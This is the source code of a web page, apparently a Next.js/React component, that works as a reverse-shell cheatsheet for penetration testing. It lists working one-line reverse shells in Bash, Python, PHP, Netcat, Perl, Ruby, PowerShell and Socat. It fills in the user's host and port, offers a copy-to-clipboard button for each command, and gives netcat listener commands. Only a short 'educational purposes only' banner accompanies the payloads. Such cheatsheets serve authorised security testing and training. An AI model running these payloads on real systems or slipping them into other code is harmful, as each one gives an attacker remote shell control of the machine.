"use client"

import React, { useState } from 'react';
import { useDebounce } from '@/hooks/useDebounce';
import { Terminal, Search, Copy, Check, AlertTriangle } from 'lucide-react';

interface Shell {
    name: string;
    command: string;
    description: string;
}

interface Category {
    title: string;
    shells: Shell[];
}

const categories: Category[] = [
    {
        title: 'Bash',
        shells: [
            { name: 'Bash TCP', command: 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1', description: 'Basic bash reverse shell over TCP' },
            { name: 'Bash UDP', command: 'bash -i >& /dev/udp/LHOST/LPORT 0>&1', description: 'Bash reverse shell over UDP' },
        ]
    },
    {
        title: 'Python',
        shells: [
            { name: 'Python 3', command: 'python3 -c \'import socket,subprocess,os;s=socket.socket();s.connect(("LHOST",LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\'', description: 'Python 3 reverse shell' },
            { name: 'Python PTY', command: 'python -c \'import os,pty,socket;s=socket.socket();s.connect(("LHOST",LPORT));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/sh")\'', description: 'Python with PTY' },
        ]
    },
    {
        title: 'PHP',
        shells: [
            { name: 'PHP exec', command: 'php -r \'$sock=fsockopen("LHOST",LPORT);exec("/bin/sh -i <&3 >&3 2>&3");\'', description: 'PHP reverse shell using exec' },
            { name: 'PHP proc_open', command: 'php -r \'$sock=fsockopen("LHOST",LPORT);$proc=proc_open("/bin/sh -i",array(0=>$sock,1=>$sock,2=>$sock),$pipes);\'', description: 'PHP using proc_open' },
        ]
    },
    {
        title: 'Netcat',
        shells: [
            { name: 'Netcat -e', command: 'nc -e /bin/sh LHOST LPORT', description: 'Traditional netcat with -e flag' },
            { name: 'Netcat mkfifo', command: 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc LHOST LPORT >/tmp/f', description: 'Netcat without -e (OpenBSD)' },
            { name: 'Ncat SSL', command: 'ncat --ssl LHOST LPORT -e /bin/sh', description: 'Encrypted reverse shell' },
        ]
    },
    {
        title: 'Perl',
        shells: [
            { name: 'Perl', command: 'perl -e \'use Socket;$i="LHOST";$p=LPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");\'', description: 'Perl reverse shell' },
        ]
    },
    {
        title: 'Ruby',
        shells: [
            { name: 'Ruby', command: 'ruby -rsocket -e\'f=TCPSocket.open("LHOST",LPORT).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\'', description: 'Ruby reverse shell' },
        ]
    },
    {
        title: 'PowerShell',
        shells: [
            { name: 'PowerShell', command: 'powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient(\'LHOST\',LPORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \'PS \' + (pwd).Path + \'> \';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"', description: 'PowerShell reverse shell' },
        ]
    },
    {
        title: 'Socat',
        shells: [
            { name: 'Socat', command: 'socat TCP:LHOST:LPORT EXEC:/bin/sh', description: 'Basic socat reverse shell' },
            { name: 'Socat TTY', command: 'socat TCP:LHOST:LPORT EXEC:"/bin/bash",pty,stderr,setsid,sigint,sane', description: 'Socat with full TTY' },
        ]
    },
];

const ReverseShellsPage = () => {
    const [searchQuery, setSearchQuery] = useState('');
    const debouncedSearch = useDebounce(searchQuery, 300);
    const [lhost, setLhost] = useState('10.10.10.10');
    const [lport, setLport] = useState('4444');
    const [copiedCommand, setCopiedCommand] = useState<string | null>(null);

    const copyToClipboard = async (text: string) => {
        const replaced = text.replace(/LHOST/g, lhost).replace(/LPORT/g, lport);
        await navigator.clipboard.writeText(replaced);
        setCopiedCommand(text);
        setTimeout(() => setCopiedCommand(null), 2000);
    };

    const filteredCategories = categories.map(cat => ({
        ...cat,
        shells: cat.shells.filter(shell =>
            shell.name.toLowerCase().includes(debouncedSearch.toLowerCase()) ||
            shell.command.toLowerCase().includes(debouncedSearch.toLowerCase())
        )
    })).filter(cat => cat.shells.length > 0);

    return (
        <div className="min-h-screen bg-black">
            {/* Hero */}
            <section className="relative pt-32 pb-16 px-4 sm:px-6">
                <div className="absolute top-0 left-1/2 -translate-x-1/2 w-[600px] h-[300px] bg-orange-500/10 rounded-full blur-[120px] pointer-events-none" />
                
                <div className="relative max-w-4xl mx-auto text-center">
                    <div className="inline-flex items-center gap-2 px-4 py-2 mb-8 rounded-full border border-white/10 bg-white/5">
                        <Terminal className="w-4 h-4 text-orange-500" />
                        <span className="text-sm text-gray-400">Cheatsheet</span>
                    </div>

                    <h1 className="text-4xl sm:text-5xl font-bold tracking-tight text-white mb-6">
                        Reverse <span className="text-orange-500">Shells</span>
                    </h1>

                    <p className="text-lg text-gray-400 max-w-xl mx-auto">
                        Collection of reverse shell commands for penetration testing.
                    </p>
                </div>
            </section>

            {/* Warning */}
            <section className="max-w-4xl mx-auto px-4 sm:px-6 mb-8">
                <div className="flex items-start gap-3 p-4 rounded-lg bg-yellow-500/10 border border-yellow-500/20">
                    <AlertTriangle className="w-5 h-5 text-yellow-400 flex-shrink-0 mt-0.5" />
                    <p className="text-sm text-yellow-200/80">
                        <strong>Educational purposes only.</strong> Only use these on systems you own or have explicit permission to test.
                    </p>
                </div>
            </section>

            {/* Config */}
            <section className="max-w-4xl mx-auto px-4 sm:px-6 mb-8">
                <div className="grid grid-cols-1 sm:grid-cols-3 gap-4">
                    <div className="relative">
                        <Search className="absolute left-4 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-500" />
                        <input
                            type="text"
                            value={searchQuery}
                            onChange={(e) => setSearchQuery(e.target.value)}
                            placeholder="Search shells..."
                            className="w-full pl-11 pr-4 py-3 bg-white/5 border border-white/10 rounded-lg text-white placeholder:text-gray-500 focus:border-orange-500/50 focus:outline-none transition-colors"
                        />
                    </div>
                    <div>
                        <input
                            type="text"
                            value={lhost}
                            onChange={(e) => setLhost(e.target.value)}
                            placeholder="LHOST"
                            className="w-full px-4 py-3 bg-white/5 border border-white/10 rounded-lg text-white font-mono placeholder:text-gray-500 focus:border-orange-500/50 focus:outline-none transition-colors"
                        />
                    </div>
                    <div>
                        <input
                            type="text"
                            value={lport}
                            onChange={(e) => setLport(e.target.value)}
                            placeholder="LPORT"
                            className="w-full px-4 py-3 bg-white/5 border border-white/10 rounded-lg text-white font-mono placeholder:text-gray-500 focus:border-orange-500/50 focus:outline-none transition-colors"
                        />
                    </div>
                </div>
            </section>

            {/* Shells */}
            <section className="max-w-4xl mx-auto px-4 sm:px-6 pb-20">
                <div className="space-y-6">
                    {filteredCategories.map((category) => (
                        <div key={category.title} className="rounded-xl border border-white/10 bg-white/[0.02] overflow-hidden">
                            <div className="px-4 py-3 border-b border-white/5 bg-white/[0.02]">
                                <h2 className="font-medium text-white">{category.title}</h2>
                            </div>
                            <div className="divide-y divide-white/5">
                                {category.shells.map((shell, index) => (
                                    <div key={index} className="p-4 hover:bg-white/[0.02] transition-colors group">
                                        <div className="flex items-start justify-between gap-4">
                                            <div className="flex-1 min-w-0">
                                                <h3 className="text-sm font-medium text-white mb-1">{shell.name}</h3>
                                                <p className="text-xs text-gray-500 mb-2">{shell.description}</p>
                                                <code className="block text-xs text-orange-400 font-mono bg-black/50 p-3 rounded overflow-x-auto">
                                                    {shell.command.replace(/LHOST/g, lhost).replace(/LPORT/g, lport)}
                                                </code>
                                            </div>
                                            <button
                                                onClick={() => copyToClipboard(shell.command)}
                                                className="p-2 text-gray-500 hover:text-white transition-colors"
                                            >
                                                {copiedCommand === shell.command 
                                                    ? <Check className="w-4 h-4 text-green-400" />
                                                    : <Copy className="w-4 h-4" />
                                                }
                                            </button>
                                        </div>
                                    </div>
                                ))}
                            </div>
                        </div>
                    ))}
                </div>

                {/* Listener */}
                <div className="mt-8 rounded-xl border border-white/10 bg-white/[0.02] p-6">
                    <h3 className="font-medium text-white mb-4">Start Listener</h3>
                    <div className="space-y-3">
                        <div className="flex items-center justify-between p-3 bg-black/50 rounded-lg">
                            <code className="text-sm text-orange-400 font-mono">nc -lvnp {lport}</code>
                            <button onClick={() => copyToClipboard(`nc -lvnp ${lport}`)} className="p-1 text-gray-500 hover:text-white">
                                <Copy className="w-4 h-4" />
                            </button>
                        </div>
                        <div className="flex items-center justify-between p-3 bg-black/50 rounded-lg">
                            <code className="text-sm text-orange-400 font-mono">rlwrap nc -lvnp {lport}</code>
                            <button onClick={() => copyToClipboard(`rlwrap nc -lvnp ${lport}`)} className="p-1 text-gray-500 hover:text-white">
                                <Copy className="w-4 h-4" />
                            </button>
                        </div>
                    </div>
                </div>
            </section>
        </div>
    );
};

export default ReverseShellsPage;
